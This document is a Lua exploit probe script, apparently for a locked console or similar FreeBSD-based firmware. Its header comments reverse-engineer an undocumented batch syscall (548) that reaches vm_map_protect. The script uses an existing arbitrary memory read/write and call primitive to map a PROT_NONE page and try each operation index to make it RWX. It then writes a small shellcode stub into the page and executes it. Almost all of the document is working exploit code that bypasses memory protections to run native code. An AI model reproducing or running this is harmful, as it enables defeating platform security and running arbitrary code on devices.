-- CRASH_CLASS: HIGH
-- PROBE 803b: raise a PROT_NONE page to RWX through syscall 548, then execute it
--
-- 548 is a batch VM API: an array of 0x20-byte records {addr, payload, len, prot byte, op dword}
-- (count in uap[0x18], array in uap[0x10]).  One op body calls
-- 0xffffffff8ac8bdb0(vmspace, addr, addr+len, prot, 0), which is vm_map_protect: it locks
-- [map+0x170], bumps [map+0x1c0], clamps against [map+0x20]/[map+0x28], calls lookup_entry and
-- then a per-entry protect.  The ordinary mprotect fails on this firmware because an anonymous
-- RW mapping is created with max_protection = RW; a PROT_NONE mapping is created with
-- max_protection = VM_PROT_ALL, so vm_map_protect should accept VM_PROT_ALL.
--
-- Step 1 maps one PROT_NONE page and confirms the protection from sys 674.
-- Step 2 runs every op index with prot=7 and re-reads 674 after each, so the op that performs
-- a protection update names itself.
-- Step 3, only if a page reaches prot 7, writes `mov eax, 0x1337; ret` and calls it.

print("=== PROBE 803b: PROT_NONE -> RWX VIA SYSCALL 548 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wrb(a, v) return pcall(function() memory.write_byte(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function split(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function ascii(a, n)
    local out = ""
    for i = 0, n - 1 do
        local b = (rd(a + i) or 0) % 256
        if b == 0 then break end
        if b >= 32 and b < 127 then out = out .. string.char(b) else out = out .. "." end
    end
    return out
end

local getpid = make_syscall(20)
local sc674 = make_syscall(674)
local sc_mmap = make_syscall(477)
local sc548 = make_syscall(548)
local sc_munmap = make_syscall(73)
pcall(function() return getpid() end)

local STRIDE, MAX = 72, 512
local regions = memory.alloc(STRIDE * MAX + 0x100)
for i = 0, 0x400, 4 do wd(regions + i, 0) end
local countp = memory.alloc(16)

local function region_of(va)
    wq(countp, uint64(0))
    local ok = pcall(function()
        return sc674(uint64(regions), uint64(STRIDE), uint64(MAX), uint64(countp), uint64(0x40000000))
    end)
    if not ok then return nil end
    local n = rd(countp) or 0
    if n > MAX then n = MAX end
    for i = 0, n - 1 do
        local b = regions + i * STRIDE
        local lo = (rd(b) or 0) + (rd(b + 4) or 0) * 4294967296
        local hi = (rd(b + 8) or 0) + (rd(b + 12) or 0) * 4294967296
        if va >= lo and va < hi then
            return lo, hi, rd(b + 0x18) or 0, ascii(b + 0x20, 0x18)
        end
    end
    return nil
end

local TARGET = 0x700000000
local function map_with(prot)
    pcall(function() return sc_munmap(uint64(TARGET), uint64(0x4000)) end)
    local ok, rv = pcall(function()
        return sc_mmap(uint64(TARGET), uint64(0x4000), uint64(prot), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok then return -999 end
    return to_num(rv)
end

local function show_target(tag)
    local lo, hi, p, nm = region_of(TARGET)
    if not lo then
        print(string.format("  %s region=GONE", tag))
        return -1
    end
    print(string.format("  %s region=[%X,%X) prot=%X %s", tag, lo, hi, p, nm))
    return p
end

local recs = memory.alloc(0x20 * 8)
local function set_rec(i, addr, payload, len, prot, op)
    local b = recs + i * 0x20
    wq(b, split(0, addr))
    wq(b + 8, split(0, payload))
    wq(b + 0x10, split(0, len))
    wd(b + 0x18, prot)
    wd(b + 0x1c, op)
end

local function batch(addr, payload, len, prot, op)
    set_rec(0, addr, payload, len, prot, op)
    local ok, rv = pcall(function()
        return sc548(uint64(0), uint64(0), uint64(recs), uint64(1), uint64(0))
    end)
    if not ok then return "pcall-fail" end
    return to_num(rv)
end

print(string.format("[0] mmap PROT_NONE ret=%d", map_with(0)))
local p0 = show_target("before")

print("")
print("[1] prot=7 on each op (re-mapping the page round each time)")
local winner = nil
for op = 0, 4 do
    map_with(0)
    local r = batch(TARGET, 0, 0x4000, 7, op)
    local p = show_target("op=" .. op .. " ret=" .. tostring(r))
    if p == 7 then
        print("  *** RWX: op " .. op .. " set prot 7 ***")
        winner = op
        break
    end
end

if not winner then
    print("")
    print("[2] no op produced prot 7 from PROT_NONE; trying prot=3 then 7 on each op")
    for op = 0, 4 do
        map_with(3)
        local r1 = batch(TARGET, 0, 0x4000, 3, op)
        local p1 = show_target("op=" .. op .. " prot3 ret=" .. tostring(r1))
        if p1 == 3 then
            local r2 = batch(TARGET, 0, 0x4000, 7, op)
            local p2 = show_target("op=" .. op .. " prot7 ret=" .. tostring(r2))
            if p2 == 7 then winner = op; print("  *** RWX via two steps, op " .. op .. " ***"); break end
        end
    end
end

if winner then
    print("")
    print("[3] writing and calling code in the page")
    -- mov eax, 0x1337 ; ret
    local code = {0xB8, 0x37, 0x13, 0x00, 0x00, 0xC3}
    for i, b in ipairs(code) do wrb(TARGET + i - 1, b) end
    print(string.format("  bytes at target: %02X %02X %02X %02X %02X %02X",
        rd(TARGET) % 256, rd(TARGET + 1) % 256, rd(TARGET + 2) % 256,
        rd(TARGET + 3) % 256, rd(TARGET + 4) % 256, rd(TARGET + 5) % 256))
    local okc, val = pcall(function()
        return native.fcall_with_rax(uint64(TARGET), 0)
    end)
    print("  call ok=" .. tostring(okc) .. " ret=" .. tostring(okc and to_num(val) or "-"))
    if okc and to_num(val) == 0x1337 then print("  *** SHELLCODE EXECUTED ***") end
else
    print("")
    print("[2] no op changed the protection; the vm_map_protect path is not reachable this way")
end

print("")
print("[4] alive pid=" .. to_num(getpid()))
